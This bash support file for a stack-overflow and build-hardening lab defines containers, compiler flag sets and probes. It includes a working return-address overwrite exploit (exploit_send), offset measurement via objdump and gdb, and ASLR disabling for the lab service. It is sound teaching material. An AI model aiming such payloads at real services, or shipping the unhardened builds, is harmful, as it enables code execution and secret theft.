#!/usr/bin/env bash
# Shared definitions for the stack overflow and build-hardening lab.
# Sourced by spawn/status/shell/reset/teardown/selftest. No side effects.
#
# This is the single source of truth for the lab's AS number, subnet, container
# names, IPs, interface names, file paths, and the exact compiler command line
# behind every build in Part 2. Every other script sources it; never hardcode
# any of these in a second place.
#
# The lab is played attacker then defender. An appliance runs a device
# registration service that copies the device name out of a request into a
# 64-byte array in a stack frame, with no bound. Part 1 has the learner measure
# the distance from that array to the saved return address, overwrite the return
# address with the address of a function already in the binary, and read back
# the recovery key that function prints.
#
# Part 2 is five rebuilds of the same source with different compiler and linker
# flags, and no change to the program. The identical exploit is sent at each
# one:
#
#   2A  -D_FORTIFY_SOURCE=2 -O2      the key still comes back
#   2B  -Wl,-z,relro,-z,now          the key still comes back
#   2C  -fPIE -pie                   the old address misses; the recomputed one
#                                    works, because ASLR is off
#   2D  -fstack-protector-strong     the process aborts and no key comes back
#   2E  all four at once             the graded end state
#
# Three of the four flags do not stop this exploit and one does. That is the
# point of the lab rather than a defect in it, and selftest.sh asserts the
# negatives (after_fortify_key_leaked, after_relro_key_leaked) so a change that
# made 2A or 2B secretly sufficient fails the harness instead of quietly making
# 2D pointless.

AS=121
DC=LAB

# ---------------------------------------------------------------------------
# One segment, three hosts, one switch. Nothing in this lab crosses a router:
# the bug is in a program, not in the network, and a second segment would add a
# boundary that no stage of the lab is enforced on.
SUBNET="121.0.0.0/24"
PREFIXLEN=24

SVC_IP="121.0.0.10"           # the appliance; devregd runs here
OPS_IP="121.0.0.20"           # the operator's workstation; the legitimate caller
ATTACKER_IP="121.0.0.66"      # the machine the overflow is sent from

# ---------------------------------------------------------------------------
# The service.
SERVICE_PORT=9000
SERVICE_NAME="devregd"
SERVICE_LOG="/var/log/devregd.log"

SRC_DIR="/opt/devreg/src"
SRC_FILE="${SRC_DIR}/devregd.c"

# The copy default_config/svc.sh restores SRC_FILE from on every spawn and every
# reset. Mode 0444 on SRC_FILE marks it as not-the-thing-to-change; it does not
# enforce it, because every shell in this lab is root inside its container and
# root carries CAP_DAC_OVERRIDE. This copy is what enforces it.
SRC_PRISTINE="/usr/local/share/minilabs/devregd.c"
BIN_DIR="/opt/devreg/bin"

# The five builds, and the one command line that produces each. The handout
# gives these same lines for the learner to type, solution/ replays them, and
# selftest.sh compiles with them, so the three cannot drift apart.
#
# -no-pie in the baseline is an opt-OUT: this image's gcc is configured with
# --enable-default-pie, so a bare `gcc -o devregd devregd.c` already produces a
# position-independent binary. -fno-stack-protector is not an opt-out on this
# toolchain, which adds no canary by default; it is written so the baseline
# states what it is instead of depending on how gcc was configured.
#
# FLAGS_FORTIFY carries -O2 because _FORTIFY_SOURCE is implemented in the C
# library's headers behind __OPTIMIZE__: built at -O0 the same source gains no
# checked calls at all, so the stage would have nothing to show.
BIN_PLAIN="${BIN_DIR}/devregd"
BIN_FORTIFY="${BIN_DIR}/devregd-fortify"
BIN_RELRO="${BIN_DIR}/devregd-relro"
BIN_PIE="${BIN_DIR}/devregd-pie"
BIN_CANARY="${BIN_DIR}/devregd-canary"
BIN_HARDENED="${BIN_DIR}/devregd-hardened"

FLAGS_PLAIN="-O0 -fno-stack-protector -no-pie"
FLAGS_FORTIFY="-O2 -D_FORTIFY_SOURCE=2 -fno-stack-protector -no-pie"
FLAGS_RELRO="-O0 -fno-stack-protector -no-pie -Wl,-z,relro,-z,now"
FLAGS_PIE="-O0 -fno-stack-protector -fPIE -pie"
FLAGS_CANARY="-O0 -fstack-protector-strong -no-pie"
FLAGS_HARDENED="-O2 -D_FORTIFY_SOURCE=2 -fstack-protector-strong -fPIE -pie -Wl,-z,relro,-z,now"

# What the vulnerable function's array is declared as, and what the exploit is
# after. NAME_LEN is a fact about the source; RET_OFFSET is a fact about the
# build and is MEASURED by ret_offset() rather than trusted from here, because
# the padding the compiler puts between the array and the saved return address
# is the compiler's choice and not the source's.
NAME_LEN=64
KEY_STRING="RECOVERY-KEY-4F1A9C77"
WIN_SYMBOL="recovery_dump"

# The name a legitimate request registers, and the reply it must produce. Every
# hardening stage is paired with this check, so a "defence" that worked by
# stopping the service fails the oracle instead of passing it.
LIVE_NAME="printer-07"
LIVE_REPLY="registered: ${LIVE_NAME}"

# ---------------------------------------------------------------------------
# Interface names, following the platform's <AS>-<segment> convention.
LAN_IF="${AS}-lan"

SW="S1"
SW_CTN="${AS}_L7_${DC}_${SW}"
BR="br0"
sw_port_of() { echo "${AS}-$1"; }        # 121-svc, 121-ops, 121-attacker

# ---------------------------------------------------------------------------
# Container names: <AS>_L7_<DC>_<name>.
SVC_CTN="${AS}_L7_${DC}_svc"
OPS_CTN="${AS}_L7_${DC}_ops"
ATTACKER_CTN="${AS}_L7_${DC}_attacker"

HOSTS=(svc ops attacker)
DEVICES=(svc ops attacker)

ctn_of() { echo "${AS}_L7_${DC}_$1"; }

ip_of() {   # <role> -> its address
    case "$1" in
        svc)      echo "$SVC_IP" ;;
        ops)      echo "$OPS_IP" ;;
        attacker) echo "$ATTACKER_IP" ;;
        *)        echo "" ;;
    esac
}

# Lab root (parent of scripts/), resolved regardless of the caller's CWD.
LAB_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )/.." >/dev/null 2>&1 && pwd )"

HOST_IMAGE="d_host_stackovf"
SWITCH_IMAGE="miniinterneteth/d_switch"

# Open vSwitch is started by hand rather than by the image's supervisord
# entrypoint, which runs ovs-ctl with its default --mlockall. In a user
# namespace CAP_IPC_LOCK cannot exceed RLIMIT_MEMLOCK, so thread stacks fail to
# lock and ovs-vswitchd dies with "pthread_create failed".
SWITCH_CMD='/usr/share/openvswitch/scripts/ovs-ctl start --no-mlockall --system-id=random && exec sleep infinity'

# net.ipv4.ping_group_range is pinned to "0 0" on every container. A rootless
# daemon rejects "0 2147483647" because the gid is outside the user namespace's
# map, and the two daemons ship different defaults. Every process in this lab
# runs as root, which is gid 0 and therefore inside this range.
PING_SYSCTL=(--sysctl "net.ipv4.ping_group_range=0 0")

# ---------------------------------------------------------------------------
# Why the appliance runs with seccomp unconfined, and only the appliance.
#
# Part 2C turns ASLR off for the service process with `setarch -R`, which calls
# personality(ADDR_NO_RANDOMIZE). Docker's default seccomp profile allows
# personality() only for the five argument values it lists, and 0x0040000 is not
# one of them, so setarch fails with EPERM under the default profile. Turning
# ASLR off is what makes the PIE stage teach anything: a position-independent
# binary whose load address never moves is not a defence, and that is only
# demonstrable if the load address can be held still.
#
# The alternative, writing kernel.randomize_va_space, is global to the machine
# and is not writable from a container at all, rootless or otherwise. This is
# the narrower change: one container, and the two client machines and the switch
# keep the default profile.
SVC_SECURITY_OPT=(--security-opt seccomp=unconfined)

# ---------------------------------------------------------------------------
# True when anything in <dir> is newer than the image built from it. An image is
# otherwise only rebuilt when it is missing, which means an edit to
# image/Dockerfile or image/devregd.c never reaches a machine that built the
# image once -- and in this lab an unrebuilt image means the learner attacks a
# different program from the one the handout quotes.
image_older_than_source() {   # <image> <dir>
    local img="$1" dir="$2" built newest
    built="$( docker image inspect -f '{{.Created}}' "$img" 2>/dev/null )" || return 1
    built="$( date -d "$built" +%s 2>/dev/null )" || return 1   # non-GNU date: skip the check
    newest="$( find "$dir" -type f -printf '%T@\n' 2>/dev/null | sort -n | tail -1 )"
    [ -n "$newest" ] || return 1
    [ "${newest%.*}" -gt "$built" ]
}

ensure_images() {
    if ! docker image inspect "$HOST_IMAGE" >/dev/null 2>&1; then
        echo "[spawn] building $HOST_IMAGE from $LAB_DIR/image (first run only)"
        docker build -t "$HOST_IMAGE" "$LAB_DIR/image" \
            || { echo "failed to build $HOST_IMAGE" >&2; return 1; }
    elif image_older_than_source "$HOST_IMAGE" "$LAB_DIR/image"; then
        echo "[spawn] rebuilding $HOST_IMAGE: $LAB_DIR/image changed since it was built"
        docker build -t "$HOST_IMAGE" "$LAB_DIR/image" \
            || { echo "failed to rebuild $HOST_IMAGE" >&2; return 1; }
    fi
    if ! docker image inspect "$SWITCH_IMAGE" >/dev/null 2>&1; then
        echo "[spawn] pulling $SWITCH_IMAGE (first run only)"
        docker pull "$SWITCH_IMAGE" >/dev/null \
            || { echo "failed to pull $SWITCH_IMAGE" >&2; return 1; }
    fi
}

# ---------------------------------------------------------------------------
# Privileged host networking, performed from a helper container, so the learner
# needs docker access and nothing else. Both ends of every veth pair are moved
# into lab containers, so the namespace the pair is created in never matters,
# which is why the helper runs --network=none rather than --network=host.
HELPER_CTN="$( ctn_of netadmin_helper )"

helper_start() {
    docker rm -f "$HELPER_CTN" >/dev/null 2>&1 || true
    docker run -d --rm --name "$HELPER_CTN" \
        --privileged --network=none --pid=host \
        "$HOST_IMAGE" sleep 600 >/dev/null
    for _ in $(seq 1 40); do
        if docker exec "$HELPER_CTN" true >/dev/null 2>&1; then
            return 0
        fi
        sleep 0.25
    done
    echo "helper container $HELPER_CTN did not become ready" >&2
    return 1
}

helper() { docker exec "$HELPER_CTN" "$@"; }
helper_stop() { docker rm -f "$HELPER_CTN" >/dev/null 2>&1 || true; }

# ---------------------------------------------------------------------------
# Shared read-only probes. status.sh and selftest.sh both use these, so the two
# cannot disagree about the lab's success condition.

running() { docker ps --format '{{.Names}}' | grep -qx "$1"; }

# --- the service process ---------------------------------------------------

# `pgrep -f` is run as the container's direct command rather than inside an
# `sh -c`, because a wrapper shell's own command line contains the pattern and
# would match itself. pgrep never matches its own process.
service_pid() {
    docker exec "$SVC_CTN" pgrep -f "$BIN_DIR/" 2>/dev/null | head -1 | tr -d '\r'
}

service_running() { [ -n "$( service_pid )" ]; }

# Which of the six builds the service is currently running, read from the
# process rather than from anything the lab wrote down.
service_binary() {
    local p; p="$( service_pid )"
    [ -n "$p" ] || { echo ""; return 0; }
    docker exec "$SVC_CTN" readlink "/proc/$p/exe" 2>/dev/null | tr -d '\r'
}

# Whether the service process has address-space randomisation switched off,
# read from where its stack was placed.
#
# The obvious source, /proc/<pid>/personality, is not readable here: it needs
# ptrace attach permission on the target, and the service is not a descendant of
# the process asking, so Linux refuses it even for root inside the container.
# The stack's placement says the same thing and needs only PTRACE_MODE_READ,
# which /proc/<pid>/maps already grants. With ADDR_NO_RANDOMIZE set, the kernel
# puts the top of the main thread's stack at the fixed 0x7ffffffff000 on x86-64;
# with randomisation on it is drawn per exec and is somewhere else.
ASLR_OFF_STACK_TOP="7ffffffff000"
service_aslr_off() {   # -> yes | no
    local p top; p="$( service_pid )"
    [ -n "$p" ] || { echo no; return 0; }
    top="$( docker exec "$SVC_CTN" sh -c \
        "grep -F '[stack]' '/proc/$p/maps' 2>/dev/null | head -1 | cut -d' ' -f1 | cut -d- -f2" \
        2>/dev/null | tr -d '\r' )"
    if [ "$top" = "$ASLR_OFF_STACK_TOP" ]; then echo yes; else echo no; fi
}

# Stop whatever build is running. `pkill -f` is likewise unwrapped: its own
# command line matches the pattern and pkill skips its own process, but a
# wrapper shell's would not be skipped.
service_stop() {
    docker exec "$SVC_CTN" pkill -f "$BIN_DIR/" >/dev/null 2>&1 || true
    sleep 0.4
}

# Start one build. `aslr` is off by default, which is what `setarch -R` does:
# it clears randomisation for this process and its children only, and leaves the
# machine's kernel.randomize_va_space alone.
service_start() {   # <binary path in the container> [on|off]
    local bin="$1" aslr="${2:-off}" pre=""
    [ "$aslr" = off ] && pre="setarch -R "
    docker exec "$SVC_CTN" sh -c \
        "setsid ${pre}${bin} ${SERVICE_PORT} >>${SERVICE_LOG} 2>&1 </dev/null &" \
        >/dev/null 2>&1
    local _
    for _ in $(seq 1 20); do
        service_running && { sleep 0.3; return 0; }
        sleep 0.2
    done
    return 1
}

service_restart() {   # <binary> [on|off]
    service_stop
    service_start "$@"
}

# --- reading a build -------------------------------------------------------

# The address of the function the exploit redirects execution to. For a
# non-PIE binary this is where it will be at run time. For a PIE binary it is an
# offset from the load base and win_runtime_addr() adds the base.
win_addr() {   # <binary> -> hex, no 0x
    docker exec "$SVC_CTN" sh -c \
        "nm '$1' 2>/dev/null | awk '/ [TtWw] ${WIN_SYMBOL}\$/ {print \$1}' | head -1" \
        2>/dev/null | tr -d '\r'
}

# Where the running process's own executable is mapped. Constant for a non-PIE
# binary; drawn once per exec for a PIE one, and held still by setarch -R.
load_base() {   # -> hex, no 0x, empty when the service is not running
    local p bin; p="$( service_pid )"; bin="$( service_binary )"
    [ -n "$p" ] && [ -n "$bin" ] || { echo ""; return 0; }
    docker exec "$SVC_CTN" sh -c \
        "grep -F '$bin' '/proc/$p/maps' 2>/dev/null | head -1 | cut -d- -f1" \
        2>/dev/null | tr -d '\r'
}

# The address to aim the exploit at, for whichever build is running now.
win_runtime_addr() {   # -> hex, no 0x
    local bin base off
    bin="$( service_binary )"
    [ -n "$bin" ] || { echo ""; return 0; }
    off="$( win_addr "$bin" )"
    [ -n "$off" ] || { echo ""; return 0; }
    if [ "$( elf_pie "$bin" )" = yes ]; then
        base="$( load_base )"
        [ -n "$base" ] || { echo ""; return 0; }
        printf '%x' $(( 0x$base + 0x$off ))
    else
        printf '%s' "$off"
    fi
}

# The distance in bytes from the start of the vulnerable array to the saved
# return address. It is MEASURED from each build rather than fixed here, because
# it is a property of the code the compiler generated and not of the source:
# -fstack-protector-strong moves the array to sit against the canary, and -O2
# inlines both copy_field and register_device into handle and lays the frame out
# differently again.
#
# Two ways, cheapest first, and both are ways the learner has. gcc addresses a
# local array through the frame pointer at -O0, so the displacement in the `lea`
# that passes it to copy_field is where the array sits and the saved return
# address is one machine word above the saved frame pointer. At -O2 there is no
# register_device left to disassemble, so the offset is measured the way Part 1
# measures it: send a pattern of four-character groups, let the process fault on
# the return, and read which group landed in the return slot.
RET_PATTERN_GROUPS="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

_ret_offset_static() {   # <binary> -> decimal, empty when register_device was inlined away
    local d
    d="$( docker exec "$SVC_CTN" sh -c \
        "objdump -d --no-show-raw-insn '$1' 2>/dev/null \
         | sed -n '/<register_device>:/,/^$/p' \
         | grep -m1 -oE 'lea +-0x[0-9a-f]+\\(%rbp\\)' \
         | grep -oE '0x[0-9a-f]+'" 2>/dev/null | tr -d '\r' )"
    [ -n "$d" ] || { echo ""; return 0; }
    echo $(( d + 8 ))
}

# Runs the build with no arguments, which makes it answer one request on standard
# input instead of listening, and feeds it the pattern under gdb. A build with a
# stack canary aborts before it returns, so nothing lands in the return slot and
# this measures nothing; that is the correct answer for such a build and not a
# failure of the measurement.
_ret_offset_dynamic() {   # <binary> -> decimal, empty when nothing reached the return slot
    local line first idx
    line="$( docker exec "$SVC_CTN" sh -c "
        python3 -c 'import sys; g=\"$RET_PATTERN_GROUPS\"; sys.stdout.buffer.write(b\"REGISTER \"+b\"\".join((c*4).encode() for c in g)+b\"\\n\")' > /tmp/.offpat
        gdb -q -batch -ex 'run < /tmp/.offpat' -ex 'x/s \$rsp' '$1' 2>/dev/null | tail -1
        rm -f /tmp/.offpat" 2>/dev/null | tr -d '\r' )"
    first="$( sed -n 's/.*"\(....\).*/\1/p' <<< "$line" )"
    [ -n "$first" ] || { echo ""; return 0; }
    # The four bytes in the return slot must be one whole group, or the pattern
    # did not reach the slot and the answer would be a guess.
    [ "$first" = "${first:0:1}${first:0:1}${first:0:1}${first:0:1}" ] || { echo ""; return 0; }
    idx="${RET_PATTERN_GROUPS%%${first:0:1}*}"
    [ "${#idx}" -lt "${#RET_PATTERN_GROUPS}" ] || { echo ""; return 0; }
    echo $(( ${#idx} * 4 ))
}

ret_offset() {   # <binary> -> decimal, empty when it cannot be measured
    local v
    v="$( _ret_offset_static "$1" )"
    [ -n "$v" ] && { echo "$v"; return 0; }
    _ret_offset_dynamic "$1"
}

# --- what a hardening flag did to a build ----------------------------------
#
# Each of these reads the ELF, so what status.sh prints is a property of the
# file the learner produced and not a record of the command they typed.

elf_pie() {   # <binary> -> yes | no
    if docker exec "$SVC_CTN" sh -c "readelf -hW '$1' 2>/dev/null | grep -q 'Type:.*DYN'"
    then echo yes; else echo no; fi
}

elf_relro() {   # <binary> -> full | partial | none
    local seg bind
    seg="$( docker exec "$SVC_CTN" sh -c "readelf -lW '$1' 2>/dev/null | grep -c GNU_RELRO" 2>/dev/null | tr -d '\r' )"
    bind="$( docker exec "$SVC_CTN" sh -c "readelf -dW '$1' 2>/dev/null | grep -cE 'BIND_NOW|FLAGS.*NOW'" 2>/dev/null | tr -d '\r' )"
    if [ "${seg:-0}" -gt 0 ] && [ "${bind:-0}" -gt 0 ]; then echo full
    elif [ "${seg:-0}" -gt 0 ]; then echo partial
    else echo none; fi
}

elf_canary() {   # <binary> -> yes | no
    if docker exec "$SVC_CTN" sh -c "nm '$1' 2>/dev/null | grep -q '__stack_chk_fail'"
    then echo yes; else echo no; fi
}

# Whether the build carries any of the C library's checked replacements. The
# name of each one is the function it replaces with a size-checked version, so
# an empty list means the flag found nothing in this program to instrument.
elf_fortify_symbols() {   # <binary> -> space-separated, may be empty
    docker exec "$SVC_CTN" sh -c \
        "nm '$1' 2>/dev/null | grep -oE '__[a-z_]+_chk' | grep -v stack_chk | sort -u | tr '\n' ' '" \
        2>/dev/null | tr -d '\r'
}

elf_fortify() {   # <binary> -> yes | no
    if [ -n "$( elf_fortify_symbols "$1" )" ]; then echo yes; else echo no; fi
}

# --- talking to the service ------------------------------------------------

# A legitimate request, sent the way the handout sends it.
register_request() {   # <from-role> <device name>
    docker exec "$( ctn_of "$1" )" sh -c \
        "printf 'REGISTER %s\n' '$2' | nc -q 2 ${SVC_IP} ${SERVICE_PORT} 2>/dev/null" \
        2>/dev/null | tr -d '\r'
}

# The liveness check every hardening stage is paired with.
service_serves() {   # -> ok | broken
    if register_request ops "$LIVE_NAME" | grep -qF "$LIVE_REPLY"; then echo ok; else echo broken; fi
}

# Send one overflow from the attacker and print whatever came back.
#
# The payload is built and sent by python3 inside the attacker container: an
# address is eight bytes and most of them are outside the printable range, so
# there is nothing to quote through two layers of shell. On the wire this is the
# same request the handout has the learner type with `python3 -c ... | nc`.
# The reply is stripped down to tab, newline and printable ASCII before it
# leaves this function. The service echoes back the name it was given, so a
# reply always contains the raw bytes of the address that was sent, and a grep
# for the recovery key against those bytes is a grep against binary input.
# Greps disagree about what that means: GNU grep matches and reports "Binary
# file matches", ugrep skips the input entirely unless -a is given. Removing the
# bytes here makes every caller's grep a text grep, whichever grep the machine
# running the lab happens to ship.
exploit_send() {   # <return-address, hex without 0x> [filler bytes]
    local addr="$1" fill="${2:-72}"
    docker exec -i "$ATTACKER_CTN" python3 - \
        "$addr" "$fill" "$SVC_IP" "$SERVICE_PORT" <<'PY' 2>/dev/null | tr -dc '\11\12\40-\176'
import socket, sys
addr, fill, host, port = int(sys.argv[1], 16), int(sys.argv[2]), sys.argv[3], int(sys.argv[4])
payload = b"REGISTER " + b"A" * fill + addr.to_bytes(8, "little") + b"\n"
out = b""
try:
    s = socket.create_connection((host, port), 5)
    s.sendall(payload)
    s.settimeout(3)
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
    s.close()
except Exception:
    pass
sys.stdout.buffer.write(out)
PY
}

# The headline oracle: does the exploit still reach the function that prints the
# recovery key, and does the key reach the attacker?
key_leaked() {   # [return address] -> yes | no
    local addr="${1:-}"
    [ -n "$addr" ] || addr="$( win_runtime_addr )"
    [ -n "$addr" ] || { echo no; return 0; }
    local off; off="$( ret_offset "$( service_binary )" )"
    if exploit_send "$addr" "${off:-72}" | grep -qF "$KEY_STRING"; then echo yes; else echo no; fi
}

# What the service wrote about itself since a given marker line. The C library's
# stack-smashing message goes to the child's standard error, which the server
# never replaces with the socket, so it lands here and not in the attacker's
# output.
service_log_tail() {   # [lines]
    docker exec "$SVC_CTN" tail -n "${1:-20}" "$SERVICE_LOG" 2>/dev/null | tr -d '\r'
}

service_log_clear() {
    docker exec "$SVC_CTN" sh -c ": > '$SERVICE_LOG'" >/dev/null 2>&1 || true
}

# Whether the C library reported a smashed stack since the log was last cleared.
canary_tripped() {   # -> yes | no
    if docker exec "$SVC_CTN" grep -q 'stack smashing detected' "$SERVICE_LOG" 2>/dev/null
    then echo yes; else echo no; fi
}

# Compile one variant, the same way the handout tells the learner to.
build_variant() {   # <output binary> <flags>
    docker exec "$SVC_CTN" sh -c "gcc $2 -o '$1' '$SRC_FILE' 2>&1" 2>&1
}
